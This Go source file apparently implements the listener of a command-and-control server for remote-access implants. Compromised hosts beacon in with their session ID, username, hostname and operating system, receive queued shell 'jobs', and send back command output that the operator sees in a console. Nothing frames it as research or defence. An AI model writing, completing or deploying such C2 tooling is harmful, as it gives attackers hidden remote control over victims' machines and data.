package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

var handshakes map[string]string = map[string]string {
	"buff": "\x0F\x0F\xFF",
}

func Handle(w http.ResponseWriter, r *http.Request) {
	var url_path string = r.URL.Path

	url_path = strings.Trim(url_path, "/")

	if strings.Count(url_path, "/") != 3 {
		return
	}

	var splitted_path []string = strings.Split(url_path, "/")

	var _session session = session{SessionId: splitted_path[0], Username: splitted_path[1], Hostname: splitted_path[2], OperatingSystem: splitted_path[3], Job: "None",IPAddress: strings.Split(r.RemoteAddr, ":")[0], Seen: time.Now().Unix()}

	var newsession bool = true

	for i:=0;i<len(sessions);i++ {
		if sessions[i].SessionId == _session.SessionId {
			newsession = false
		}
	}

	if !verify_session(_session) {
		return
	}

	if newsession {
		sessions = append(sessions, _session)
		fmt.Fprint(w, "None")

		return
	} 
	
	for i:=0;i<len(sessions);i++ {
		if sessions[i].SessionId==_session.SessionId {
			sessions[i].Seen = time.Now().Unix()
		}
	}


	body, err := ioutil.ReadAll(r.Body)
    
	if err != nil {
        return
    }

    defer r.Body.Close()
	
	if string(body) != handshakes["buff"] && selected_session == _session.SessionId {
		fmt.Printf("%s", Fore["GREEN"]+string(body)+Fore["RESET"])
		
		for i:=0;i<len(sessions);i++ {
			if sessions[i].SessionId == _session.SessionId {
				sessions[i].Job = "None"
			}
		}

		continue_shell = true
		selected_session = ""
	}

	for i:=0;i<len(sessions);i++ {
		if sessions[i].SessionId == _session.SessionId {
			fmt.Fprintf(w, "%s", sessions[i].Job)
		}
	}
}